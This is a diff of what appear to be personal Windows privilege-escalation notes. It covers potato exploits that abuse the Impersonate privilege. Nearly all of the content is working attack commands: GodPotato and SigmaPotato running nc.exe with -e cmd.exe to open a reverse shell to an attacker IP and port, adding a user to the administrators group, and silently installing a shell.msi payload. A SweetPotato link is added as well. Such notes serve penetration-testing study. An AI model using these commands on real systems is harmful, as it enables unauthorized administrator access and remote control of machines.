@@ -119,7 +119,7 @@ msiexec /quiet /qn /i shell.msi
 If you see Impersonate with whoami /priv, stick with sigma and god potato:
 <img width="720" height="352" alt="image" src="https://github.com/user-attachments/assets/db7a42ef-0fb8-4808-8924-c0811265ec4c" />
 
-Share the file, along with nc.exe and then run these for god potato:
+### Share the file, along with nc.exe and then run these for god potato:
 ```
 .\GodPotato-NET4.exe -cmd "cmd /c whoami"
 ```
@@ -127,10 +127,16 @@ Share the file, along with nc.exe and then run these for god potato:
 .\GodPotato-NET4.exe -cmd "C:\Users\user\Desktop\nc.exe <TP> 4444 -e cmd.exe"
 ```
 
-For Sigma potato:
+### For Sigma potato:
 ```
 .\sp.exe "net localgroup administrators user /add"
 ```
+```
+.\SigmaPotato.exe "C:\path\to\nc.exe -e cmd.exe <ATTACKER_IP> <PORT>"
+```
+### Sweet Potato:
+https://github.com/uknowsec/SweetPotato/blob/master/README.md --> site
+
 
 ## PATH Hijack
 PowerUp may show with write permissions to the PATH directory
